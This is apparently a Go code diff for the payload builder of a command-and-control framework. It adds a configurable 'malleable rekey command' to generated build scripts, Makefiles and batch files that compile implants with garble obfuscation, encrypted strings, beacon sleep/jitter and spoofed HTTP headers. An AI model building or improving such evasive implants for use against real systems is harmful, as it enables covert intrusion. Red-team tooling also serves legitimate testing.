@@ -2,6 +2,7 @@
 package builder
 
 import (
+	"c2/internal/common/config"
 	"c2/internal/websocket/agent"
 	"c2/internal/websocket/hub"
 	"c2/internal/websocket/listeners"
@@ -326,10 +327,21 @@ func (b *Builder) logSafetyChecks(safetyChecks SafetyChecks, username string, li
 }
 
 // Updated writeProjectFiles to include safety checks in the generated code
-func (b *Builder) writeProjectFiles(data *buildData, config *PayloadConfigWrapper) error {
+func (b *Builder) writeProjectFiles(data *buildData, payloadConfig *PayloadConfigWrapper) error {
+	// Load malleable config for rekey command
+	malleableConfig, err := config.GetMalleableConfig()
+	if err != nil {
+		log.Printf("[Builder] Warning: Failed to load malleable config: %v", err)
+	}
+	rekeyCommand := "rekey_required" // Default
+	if malleableConfig != nil {
+		rekeyCommand = malleableConfig.GetRekeyCommand()
+		log.Printf("[Builder] Using malleable rekey command: %q", rekeyCommand)
+	}
+
 	// Prepare custom headers JSON
 	customHeaders := make(map[string]string)
-	for _, header := range config.PayloadConfig.HTTPHeaders.CustomHeaders {
+	for _, header := range payloadConfig.PayloadConfig.HTTPHeaders.CustomHeaders {
 		customHeaders[header.Name] = header.Value
 	}
 	headersJSON, _ := json.Marshal(customHeaders)
@@ -342,7 +354,7 @@ func (b *Builder) writeProjectFiles(data *buildData, config *PayloadConfigWrappe
 		Format string
 	}
 
-	for _, handler := range config.HTTPRoutes.GetHandlers {
+	for _, handler := range payloadConfig.HTTPRoutes.GetHandlers {
 		if handler.Enabled {
 			getRoute = handler.Path
 			// Check for custom method
@@ -372,7 +384,7 @@ func (b *Builder) writeProjectFiles(data *buildData, config *PayloadConfigWrappe
 		Format string
 	}
 
-	for _, handler := range config.HTTPRoutes.PostHandlers {
+	for _, handler := range payloadConfig.HTTPRoutes.PostHandlers {
 		if handler.Enabled {
 			postRoute = handler.Path
 			// Check for custom method
@@ -404,8 +416,8 @@ func (b *Builder) writeProjectFiles(data *buildData, config *PayloadConfigWrappe
 		"port":               fmt.Sprintf("%d", b.listener.Port),
 		"getMethod":          getMethod,
 		"postMethod":         postMethod,
-		"userAgent":          config.PayloadConfig.HTTPHeaders.UserAgent,
-		"contentType":        config.PayloadConfig.HTTPHeaders.ContentType,
+		"userAgent":          payloadConfig.PayloadConfig.HTTPHeaders.UserAgent,
+		"contentType":        payloadConfig.PayloadConfig.HTTPHeaders.ContentType,
 		"customHeaders":      string(headersJSON),
 		"getRoute":           getRoute,
 		"postRoute":          postRoute,
@@ -577,8 +589,8 @@ func init() {
 		// Regular values
 		data.xorKey,
 		data.clientID,
-		config.PayloadConfig.Sleep,
-		config.PayloadConfig.Jitter,
+		payloadConfig.PayloadConfig.Sleep,
+		payloadConfig.PayloadConfig.Jitter,
 		encryptedValues["getMethod"],
 		encryptedValues["postMethod"],
 		encryptedValues["userAgent"],
@@ -625,19 +637,20 @@ fi
 
 echo "Building for %s/%s..."
 echo "Using HTTP methods: GET=%s, POST=%s"
+echo "Malleable rekey command: %s"
 
 # Check if garble is installed
 if ! command -v garble &> /dev/null; then
     echo "Warning: garble not found, building without obfuscation"
     GOOS=%s GOARCH=%s go build \
-        -ldflags="-w -s -buildid=" \
+        -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" \
         -trimpath \
         -o "${OUTPUT_NAME}" \
         *.go
 else
     echo "Building with garble obfuscation..."
     GOOS=%s GOARCH=%s garble -seed=random -literals -tiny -debugdir=none build \
-        -ldflags="-w -s -buildid=" \
+        -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" \
         -trimpath \
         -o "${OUTPUT_NAME}" \
         *.go
@@ -658,8 +671,11 @@ fi
 		data.os, data.arch, binaryExt,
 		data.os, data.arch,
 		getMethod, postMethod,
+		rekeyCommand,
 		data.os, data.arch,
+		rekeyCommand,
 		data.os, data.arch,
+		rekeyCommand,
 	)
 
 	if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.sh", data.clientID), []byte(buildScriptContent), 0755); err != nil {
@@ -670,12 +686,13 @@ fi
 	makefileContent := fmt.Sprintf(`# Makefile for payload project
 # Target: %s/%s
 # HTTP Methods: GET=%s, POST=%s
+# Malleable Rekey Command: %s
 %s
 
 BINARY_NAME = payload_%s_%s%s
 GOOS = %s
 GOARCH = %s
-LDFLAGS = -w -s -buildid=
+LDFLAGS = -w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'
 GARBLE_FLAGS = -seed=random -literals -tiny -debugdir=none
 
 .PHONY: all build build-garble clean info
@@ -709,9 +726,11 @@ help:
 `,
 		data.os, data.arch,
 		getMethod, postMethod,
+		rekeyCommand,
 		strings.ReplaceAll(safetyCheckComment, "// ", "# "),
 		data.os, data.arch, binaryExt,
 		data.os, data.arch,
+		rekeyCommand,
 		getMethod, postMethod,
 	)
 
@@ -725,6 +744,7 @@ help:
 REM Build script for Windows payload
 REM Target: %s/%s
 REM HTTP Methods: GET=%s, POST=%s
+REM Malleable Rekey Command: %s
 %s
 
 set OUTPUT_NAME=payload_%s_%s.exe
@@ -732,6 +752,7 @@ if NOT "%%1"=="" set OUTPUT_NAME=%%1
 
 echo Building for %s/%s...
 echo Using HTTP methods: GET=%s, POST=%s
+echo Malleable rekey command: %s
 
 REM Check if garble exists
 where garble >nul 2>nul
@@ -739,12 +760,12 @@ if %%ERRORLEVEL%% NEQ 0 (
     echo Warning: garble not found, building without obfuscation
     set GOOS=%s
     set GOARCH=%s
-    go build -ldflags="-w -s -buildid=" -trimpath -o "%%OUTPUT_NAME%%" *.go
+    go build -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" -trimpath -o "%%OUTPUT_NAME%%" *.go
 ) else (
     echo Building with garble obfuscation...
     set GOOS=%s
     set GOARCH=%s
-    garble -seed=random -literals -tiny -debugdir=none build -ldflags="-w -s -buildid=" -trimpath -o "%%OUTPUT_NAME%%" *.go
+    garble -seed=random -literals -tiny -debugdir=none build -ldflags="-w -s -buildid= -X 'main.MALLEABLE_REKEY_COMMAND=%s'" -trimpath -o "%%OUTPUT_NAME%%" *.go
 )
 
 if %%errorlevel%% equ 0 (
@@ -757,12 +778,16 @@ if %%errorlevel%% equ 0 (
 `,
 			data.os, data.arch,
 			getMethod, postMethod,
+			rekeyCommand,
 			strings.ReplaceAll(safetyCheckComment, "// ", "REM "),
 			data.os, data.arch,
 			data.os, data.arch,
 			getMethod, postMethod,
+			rekeyCommand,
 			data.os, data.arch,
+			rekeyCommand,
 			data.os, data.arch,
+			rekeyCommand,
 		)
 
 		if err := os.WriteFile(fmt.Sprintf("/shared/%s_build.bat", data.clientID), []byte(buildBatContent), 0644); err != nil {
@@ -878,10 +903,29 @@ func (b *Builder) registerWithAgentService(ctx context.Context, data *buildData)
 }
 
 // Updated prepareBuildEnvironment function to support custom HTTP methods
-func (b *Builder) prepareBuildEnvironment(data *buildData, config *PayloadConfigWrapper) ([]string, error) {
+func (b *Builder) prepareBuildEnvironment(data *buildData, payloadConfig *PayloadConfigWrapper) ([]string, error) {
+	// Load malleable config for rekey command
+	malleableConfig, err := config.GetMalleableConfig()
+	if err != nil {
+		log.Printf("[Builder] Warning: Failed to load malleable config: %v", err)
+	}
+	rekeyCommand := "rekey_required" // Default
+	rekeyStatusField := "status"
+	rekeyDataField := "data"
+	rekeyIDField := "command_db_id"
+
+	if malleableConfig != nil {
+		rekeyCommand = malleableConfig.RekeyCommand
+		rekeyStatusField = malleableConfig.RekeyStatusField
+		rekeyDataField = malleableConfig.RekeyDataField
+		rekeyIDField = malleableConfig.RekeyIDField
+		log.Printf("[Builder] Using malleable rekey for build - command: %q, fields: {%s, %s, %s}",
+			rekeyCommand, rekeyStatusField, rekeyDataField, rekeyIDField)
+	}
+
 	// First prepare custom headers
 	customHeaders := make(map[string]string)
-	for _, header := range config.PayloadConfig.HTTPHeaders.CustomHeaders {
+	for _, header := range payloadConfig.PayloadConfig.HTTPHeaders.CustomHeaders {
 		customHeaders[header.Name] = header.Value
 	}
 	headersJSON, err := json.Marshal(customHeaders)
@@ -898,7 +942,7 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, config *PayloadConfig
 
 	// Find first enabled GET handler
 	var getRoute string
-	for _, handler := range config.HTTPRoutes.GetHandlers {
+	for _, handler := range payloadConfig.HTTPRoutes.GetHandlers {
 		if handler.Enabled {
 			getRoute = handler.Path
 			// Check if handler has a custom method field
@@ -930,7 +974,7 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, config *PayloadConfig
 
 	// Find first enabled POST handler
 	var postRoute string
-	for _, handler := range config.HTTPRoutes.PostHandlers {
+	for _, handler := range payloadConfig.HTTPRoutes.PostHandlers {
 		if handler.Enabled {
 			postRoute = handler.Path
 			// Check if handler has a custom method field
@@ -963,8 +1007,8 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, config *PayloadConfig
 		"PORT":                  fmt.Sprintf("%d", b.listener.Port),
 		"GET_METHOD":            getMethod,  // Add custom GET method
 		"POST_METHOD":           postMethod, // Add custom POST method
-		"USER_AGENT":            config.PayloadConfig.HTTPHeaders.UserAgent,
-		"CONTENT_TYPE":          config.PayloadConfig.HTTPHeaders.ContentType,
+		"USER_AGENT":            payloadConfig.PayloadConfig.HTTPHeaders.UserAgent,
+		"CONTENT_TYPE":          payloadConfig.PayloadConfig.HTTPHeaders.ContentType,
 		"CUSTOM_HEADERS":        string(headersJSON),
 		"GET_ROUTE":             getRoute,
 		"POST_ROUTE":            postRoute,
@@ -989,8 +1033,12 @@ func (b *Builder) prepareBuildEnvironment(data *buildData, config *PayloadConfig
 		fmt.Sprintf("ARCH=%s", data.arch),
 		fmt.Sprintf("OUTPUT_FILENAME=%s", data.binaryName),
 		fmt.Sprintf("CLIENTID=%s", data.clientID),
-		fmt.Sprintf("SLEEP=%d", config.PayloadConfig.Sleep),
-		fmt.Sprintf("JITTER=%d", config.PayloadConfig.Jitter),
+		fmt.Sprintf("SLEEP=%d", payloadConfig.PayloadConfig.Sleep),
+		fmt.Sprintf("JITTER=%d", payloadConfig.PayloadConfig.Jitter),
+		fmt.Sprintf("MALLEABLE_REKEY_COMMAND=%s", rekeyCommand),
+		fmt.Sprintf("MALLEABLE_REKEY_STATUS_FIELD=%s", rekeyStatusField),
+		fmt.Sprintf("MALLEABLE_REKEY_DATA_FIELD=%s", rekeyDataField),
+		fmt.Sprintf("MALLEABLE_REKEY_ID_FIELD=%s", rekeyIDField),
 	}
 
 	// Add encrypted values to environment variables
